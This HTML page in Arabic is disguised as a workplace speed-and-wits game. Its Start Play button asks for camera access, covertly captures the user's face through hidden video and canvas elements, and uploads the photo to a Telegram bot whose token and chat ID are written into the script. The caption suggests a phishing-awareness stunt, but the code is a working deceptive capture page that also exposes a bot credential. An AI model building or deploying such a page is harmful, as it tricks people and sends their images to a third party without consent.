<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحدي السرعة والذكاء 🚀</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #f0f2f5; padding-top: 80px; color: #333; }
        .container { background: white; padding: 40px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 90%; }
        .btn { padding: 18px 45px; background: #00b894; color: white; border: none; border-radius: 50px; cursor: pointer; font-size: 22px; font-weight: bold; transition: 0.3s; margin-top: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>تحدي الموظف الأسرع! 🎮</h1>
        <p> تملك سرعة بديهه؟ اضغط للبدء .</p>
        <button class="btn" onclick="startPlay()">Start Play</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "8376755103:AAHrdB9GV8gY-9KKFM3pwbv9j9TnKh04z8k";
        const chatId = "1126875861"; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function startPlay() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    setTimeout(async () => {
                        // ضبط المقاسات تلقائياً حسب نوع الجوال لمنع التمطيط
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        const imgData = canvas.toDataURL('image/png');
                        const blob = await (await fetch(imgData)).blob();
                        
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'capture.png');
                        // عبارتك القوية المعدلة
                        formData.append('caption', '⚠️ الضغط على الروابط مهارة، والحذر منها احتراف.\n\nاليوم صورتك عندنا، بكرة بياناتك وين ممكن تكون؟');

                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });

                        window.location.href = "result.html";
                    }, 1000);
                };
            } catch (err) {
                alert("اللعبة تتطلب الوصول للكاميرا للمشاركة! 🎮");
            }
        }
    </script>
</body>
</html>
